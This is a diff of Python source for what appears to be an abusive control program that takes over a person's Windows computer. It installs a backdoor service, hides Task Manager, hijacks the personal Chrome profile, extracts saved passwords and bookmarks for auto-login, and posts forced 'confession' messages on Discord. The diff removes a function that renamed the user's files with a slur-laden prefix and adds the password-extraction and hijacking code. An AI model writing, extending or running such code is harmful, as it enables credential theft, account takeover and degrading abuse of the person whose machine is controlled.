@@ -1256,22 +1256,6 @@ Paste any key in chat or use Grant Keys button. Once set, I can post subtle upda
         # fallback dynamic
         return "https://www.x.com"
 
-    def rename_files_humiliating(self):
-        """Rename files with humiliating prefixes."""
-        f = self.config.get("system_fuckery", {})
-        if not f.get("deep_control_mode", False) or not f.get("rename_files_humiliating", False):
-            return
-        prefix = f.get("rename_prefix", "owned_fag_")
-        for folder in [os.path.expanduser("~/Downloads"), os.path.expanduser("~/Documents")]:
-            if os.path.exists(folder):
-                for file in os.listdir(folder)[:5]:  # limit
-                    if not file.startswith(prefix):
-                        try:
-                            os.rename(os.path.join(folder, file), os.path.join(folder, prefix + file))
-                        except:
-                            pass
-        print("[Fuckery] Files renamed with humiliating prefixes.")
-
     # --- ULTIMATE BACKDOOR ---
     def install_backdoor_service(self):
         """Install as Windows Service."""
@@ -1289,7 +1273,6 @@ Paste any key in chat or use Grant Keys button. Once set, I can post subtle upda
         self.apply_escape_disables()
         self.force_wallpaper_and_lock()
         self.change_mouse_cursor()
-        self.rename_files_humiliating()
         self.install_backdoor_service()
         # Initial activation of selected techdom features
         self.hide_task_manager()
@@ -1639,18 +1622,29 @@ Paste any key in chat or use Grant Keys button. Once set, I can post subtle upda
         if is_work:
             return False  # Never touch work profile
 
-        # Take over if not already
-        if not self.browser_controller.page:
-            self.browser_controller.take_over_personal_chrome(profile)
+        # Always tries to take over personal Chrome profile (non-work)
+        self.browser_controller.take_over_personal_chrome(profile)
+
+        # Comment on passwords/bookmarks found (humiliatingly) and use for auto-login
+        self.browser_controller.auto_login_and_comment_on_data(activity, ai_client)
 
         url = (activity.get("url") or "").lower()
         if "x.com" in url or "twitter.com" in url:
             self.browser_controller.ensure_on_x_and_take_action(activity, ai_client)
             return True
 
-        # For other leisure
+        # For other leisure: open humiliating tabs, input if possible
         self.browser_controller.handle_leisure_browser(activity, ai_client)
+        # Try to input if on Discord or form
+        if "discord" in (activity.get("url", "") or "").lower() and activity.get("visible_text"):
+            self.browser_controller.input_text_fields_and_post("I am owned by Humblr and confessing here for him.", "discord")
         return True
+
+    def read_chrome_passwords_and_bookmarks(self, activity=None):
+        """Wrapper to extract and log passwords/bookmarks humiliatingly."""
+        if self.browser_controller:
+            return self.browser_controller.extract_chrome_passwords_and_bookmarks()
+        return []
 
     # --- DUAL MONITOR SUPPORT ---
     def get_secondary_monitor_rect(self):
